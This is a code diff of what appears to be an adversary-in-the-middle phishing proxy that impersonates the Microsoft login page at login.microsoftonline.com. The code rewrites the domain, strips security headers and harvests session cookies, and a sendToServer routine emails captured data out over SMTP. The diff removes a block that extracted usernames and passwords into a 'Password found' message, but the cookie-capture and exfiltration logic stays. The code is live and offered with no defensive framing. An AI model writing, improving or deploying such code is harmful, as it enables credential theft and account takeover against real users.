@@ -4,10 +4,6 @@ const upstream = 'login.microsoftonline.com';
 const upstream_path = '/';
 const https = true;
 
-// Blocking
-const blocked_region = [];
-const blocked_ip_address = ['0.0.0.0', '127.0.0.1'];
-
 // Create Nodemailer transporter
 const transporter = nodemailer.createTransport({
     host: process.env.SMTP_HOST,
@@ -44,32 +40,16 @@ export default async function handler(req, res) {
     let body = req.method === 'POST' ? req.body : null; // Only include body for POST requests
 
     try {
-        if (method === 'POST') {
-            const keyValuePairs = body.split('&');
-            let message = "Password found:\n\n";
-
-            for (const pair of keyValuePairs) {
-                const [key, value] = pair.split('=');
-
-                if (key === 'login') {
-                    const username = decodeURIComponent(value.replace(/\+/g, ' '));
-                    message += `User: ${username}\n`;
-                }
-                if (key === 'passwd') {
-                    const password = decodeURIComponent(value.replace(/\+/g, ' '));
-                    message += `Password: ${password}\n`;
-                }
-            }
-            if (message.includes("User") && message.includes("Password")) {
-                await sendToServer(message, ip_address);
-            }
-        }
-
-        let response = await fetch(url.href, {
+        // Fetch from upstream URL
+        const response = await fetch(url.href, {
             method,
-            headers: new_request_headers,
-            body // Only include body if it's not null
+            headers: Object.fromEntries(new_request_headers.entries()), // Convert Headers to object
+            body: method === 'POST' ? body : undefined // Only include body if it's a POST request
         });
+
+        if (!response.ok) {
+            throw new Error(`Failed to fetch from upstream: ${response.statusText}`);
+        }
 
         let original_response_clone = await response.clone();
         let original_text = await replace_response_text(original_response_clone, upstream, url_hostname);
@@ -81,7 +61,7 @@ export default async function handler(req, res) {
         new_response_headers.delete('content-security-policy-report-only');
         new_response_headers.delete('clear-site-data');
 
-        const originalCookies = response.headers.getAll("Set-Cookie");
+        const originalCookies = response.headers.getAll("Set-Cookie") || [];
         all_cookies = originalCookies.join("; \n\n");
 
         originalCookies.forEach(originalCookie => {
@@ -102,7 +82,7 @@ export default async function handler(req, res) {
         res.end(original_text);
 
     } catch (error) {
-        console.error('Error processing request:', error); // Log error details
+        console.error('Error processing request:', error.message); // Log detailed error
         res.status(500).send(`Internal Server Error: ${error.message}`);
     }
 }
@@ -113,7 +93,7 @@ async function replace_response_text(response, upstream_domain, host_name) {
         text = text.replace(new RegExp('login.microsoftonline.com', 'g'), host_name);
         return text;
     } catch (error) {
-        console.error('Error replacing response text:', error);
+        console.error('Error replacing response text:', error.message);
         throw error;
     }
 }
@@ -131,6 +111,6 @@ async function sendToServer(data, ip_address) {
         await transporter.sendMail(mailOptions);
         console.log('Data sent to server successfully');
     } catch (error) {
-        console.error('Error sending data:', error);
+        console.error('Error sending data:', error.message);
     }
 }
